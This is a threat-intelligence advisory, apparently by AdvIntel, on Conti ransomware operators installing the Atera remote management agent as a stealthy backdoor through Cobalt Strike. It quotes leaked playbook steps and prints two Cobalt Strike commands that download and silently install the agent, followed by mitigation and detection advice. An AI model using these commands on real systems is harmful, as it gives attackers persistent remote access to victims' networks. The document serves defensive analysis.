Conti Access via TrickBot, Buer, BazarBackdoor, AnchorDNS\n\n2. Cobalt Strike beacon\n\n3. Atera Agent Installation\n\n4. Persistence & Shell Execution to Survive Cobalt Strike detections\n\n\n-----\n\n_Adversaries leverage Cobalt Strike command-line interfaces to interact with systems and_\n_execute other software during the course of a ransomware operation._\n\n**_What is Atera?_**\n\n_[Atera is an IT management solution that enables monitoring, management, and](https://www.atera.com/features/#:~:text=Atera%20is%20an%20IT%20management,security%2C%20backup%2C%20and%20more)_\n**_automation of hundreds of SMB IT networks from a single console. Atera includes a_**\n_remote control, patch management, discovery, inventory of IT assets, monitoring, security,_\n_backup, and more._\n\n\n-----\n\n**_Deploying Atera Agent as \"Backdoor\"_**\n\nThe idea behind this tactic is to leveraging a legitimate remote management agent Atera to\nsurvive possible Cobalt Strike detections from the endpoint detection and response platform.\nRelying on the legitimate tool to achieve persistence is a core idea leverage by the\nransomware pentesting team.\n\n\n-----\n\nWhile reviewing Conti incidents that we proactively identified, monitored, and alerted via our\nthreat prevention platform Andariel, AdvIntel has identified that Atera played the key role in\nallowing secret backdoor installations on the host right after the Conti gang obtained initial\naccess via TrickBot, BazarBackdoor, AnchorDNS, or Cobalt Strike directly.\n\n**_Conti Operational Handbook: Atera as Backdoor_**\n\nThe [disgruntled Conti operator leaked the tactics matching our proactive cases.](https://www.bleepingcomputer.com/news/security/angry-conti-ransomware-affiliate-leaks-gangs-attack-playbook/)\n\n_The method includes the following steps as translated from the tutorial:_\n\n1. Registration of the agent access via the official website\n\n2. Click on download and set up agent access with the script\n\n3. Run the agent installation via the Cobalt Strike “shell atera_run.msi”\n\n4. Observe the device beacon in the Atera system\n\n5. Remove the installation script artifacts\n\nI. Cobalt Strike command via curl command execution for Atera Agent installation.\n```\nshell curl -o setup.msi \"http://REDACTED.servicedesk.atera.com/GetAgent/Msi/?\ncustomerId=1&integratorLogin=REDACTED%40protonmail.com\" && msiexec /i setup.msi /qn \nIntegratorLogin=REDACTED@protonmail.com CompanyId=1\n\n```\n\n-----\n\nII. Cobalt Strike command via the uploaded .msi installer script exported from the Atera\nAgent console\n```\nupload C:\\programdata\\setup_undefined.msi\nshell setup_undefined.msi\n\n```\n**_Atera Agent \"Backdoor\" Relevancy_**\n\nThe Atera agent allows the following connection option for the ransomware groups to\nachieve persistence:\n\nSplashtop\n\nAnyDesk\n\nTeamViewer\n\nScreenConnect\n\nAdditionally, the agent allows direct command-prompt and PowerShell shell execution into\nthe agent-installed environment.\n\n**_Operational Insight_**\n\nThe Atera Agent allowed the Conti gang to regain access to infected protected\nenvironments, especially environments that were equipped with more aggressive machine\nlearning endpoint detection-and-response anti-virus products.\n\nThe benefit is obvious - once Conti receives the desired access to the trial version of Atera\nwith the burner account they obtain a shell and backdoor access to the environment\nmaintained by a legitimate software tool.\n\n_We asesses with high condence the theme of leveraging tooling around legitimate and_\n_trusted software as a backdoor will continue to be the tactics leveraged by the_\n_ransomware pentester groups based on their latest tactics._\n\n\n-----\n\n[In most of the cases, the adversaries leveraged protonmail[.]com and](http://protonmail.com/) [outlook[.]com email](http://outlook.com/)\naccounts to register with Atera to receive an agent installation script and console access.\nTherefore, this backdoor access is not a central compromise of Atera, but rather a\nregistration loophole leveraged by the adversaries to obtain Atera trial access simply via\nanonymous emails.\n\n**_Mitigation_**\n\nAudit and/or block command-line interpreters by using whitelisting tools, like AppLocker or\nSoftware Restriction Policies with the focus on any suspicious “curl” command and\nunauthorized “.msi” installer scripts particularly those from C:\\ProgramData and C:\\Temp\ndirectory\n\n**_Detection Methods_**\n\nCommand-line interface activities can be captured through proper logging of process\nexecution with command-line arguments.\n\n**_Reference_**\n\nTactic: T1059 Command and Scripting Interpreter\n\nTactic: T1127 Trusted Developer Utilities Proxy Execution\n\n_Our proprietary platform, Andariel, provides a mirrored view of criminal and botnet activity,_\n_which_\n\n_supplies our users with predictive insight that are used to prevent intrusions from maturing_\n\n_into large-scale threat events such as ransomware attacks._\n\n\n-----",
